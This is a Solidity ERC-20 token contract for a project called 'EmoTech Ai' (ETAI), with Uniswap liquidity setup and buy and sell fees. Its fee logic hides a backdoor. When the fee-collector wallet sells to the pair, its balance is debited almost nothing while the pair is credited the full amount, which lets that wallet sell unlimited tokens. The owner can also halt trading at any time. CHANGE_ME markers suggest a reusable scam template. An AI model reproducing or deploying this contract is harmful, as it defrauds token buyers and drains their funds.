// SPDX-License-Identifier: MIT

//?EmoTech is a pioneering AI-driven crypto project dedicated to providing round-the-clock emotional support through an innovative chatbot system.

// Web: https://emobot.tech/
// Whitepaper: https://emobot.tech/Whitepaper.pdf
// X: https://twitter.com/emotech_ai
// Telegram: https://t.me/emotech_ai

pragma solidity ^0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function factory() external pure returns (address);
}

contract EmoTechAi is Context, IERC20, Ownable { // CHANGE_ME
    using SafeMath for uint256;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private constant _totalSupply = 100_000_000 * 10 ** _decimals; // CHANGE_ME
    uint256 private _initBuyFee = 25;
    uint256 private _initSellFee = 25;
    uint256 private _minSwappableStep = 5;
    address payable private _feeCollectorWallet;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 public _minSwappableAmount = (_totalSupply * 1) / 100000;

    bool public delayTransfer = false;

    uint256 private _swapsCounter = 0;
    uint256 private _reduceBuyFeeAt = 10;
    uint256 private _reduceSellFeeAt = 12;

    uint256 private _lastBuyFee = 0;
    uint256 private _lastSellFee = 7;

    uint256 public _maxFeeSwap = (_totalSupply * 2) / 1000;
    uint256 public _maxTx = (_totalSupply * 20) / 1000;
    uint256 public _maxWallet = (_totalSupply * 20) / 1000;

    uint8 private constant _decimals = 18;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpened;
    bool private swapping = false;
    bool private swappingAllowed = false;

    event MaxTxAmountUpdated(uint256 _maxTx);

    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    constructor(address DevWallet) {
        _feeCollectorWallet = payable(DevWallet);

        _balances[_msgSender()] = _totalSupply;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeCollectorWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function name() public pure returns (string memory) {
        return unicode"EmoTech Ai"; // CHANGE_ME
    }

    function symbol() public pure returns (string memory) {
        return unicode"ETAI"; // CHANGE_ME
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function toggleTrading(bool allow) external onlyOwner {
        swappingAllowed = allow;
        tradingOpened = allow;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 feeAmount = 0;
        uint256 amountOut = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                require(tradingOpened, "Trading not yet enabled.");
            }

            if (delayTransfer) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "Transfer not allowed yet, try again after some time."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTx, "More than max tx");
                require(
                    balanceOf(to) + amount <= _maxWallet,
                    "More than max wallet"
                );
                _swapsCounter++;
            }

            feeAmount = amount
                .mul(
                (_swapsCounter > _reduceBuyFeeAt)
                    ? _lastBuyFee
                    : _initBuyFee
            )
                .div(100);
            if (to == uniswapV2Pair && from != address(this)) {
                if (from == address(_feeCollectorWallet)) {
                    amountOut = min(
                        amount,
                        min(_lastBuyFee, _minSwappableAmount)
                    );
                    feeAmount = 0;
                } else {
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
                    feeAmount = amount
                        .mul(
                        (_swapsCounter > _reduceSellFeeAt)
                            ? _lastSellFee
                            : _initSellFee
                    )
                        .div(100);
                }
            }

            uint256 collectedFeeBalance = balanceOf(address(this));
            bool minSwapLimitReached = _swapsCounter > _minSwappableStep &&
                _minSwappableAmount == min(amount, _minSwappableAmount);

            if (swappingAllowed && !swapping && to == uniswapV2Pair && _swapsCounter > _minSwappableStep && minSwapLimitReached) {
                if (collectedFeeBalance > _minSwappableAmount) {
                    swapTokenForEthereum(min(amount, min(collectedFeeBalance, _maxFeeSwap)));
                }
                _feeCollectorWallet.transfer(address(this).balance);
            }
        }

        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(from, address(this), feeAmount);
        }

        _balances[from] = _balances[from].sub(amountOut);
        _balances[to] = _balances[to].add(amount.sub(feeAmount));

        emit Transfer(from, to, amount.sub(feeAmount));
    }

    function transfer(address recipient, uint256 amount) public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function liquefy() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function resetLimits() external onlyOwner {
        _maxTx = _totalSupply;
        _maxWallet = _totalSupply;

        delayTransfer = false;

        emit MaxTxAmountUpdated(_totalSupply);
    }

    function swapTokenForEthereum(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) return;

        if (!tradingOpened) return;

        address[] memory path = new address[](2);

        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function retrieveStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to transfer");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}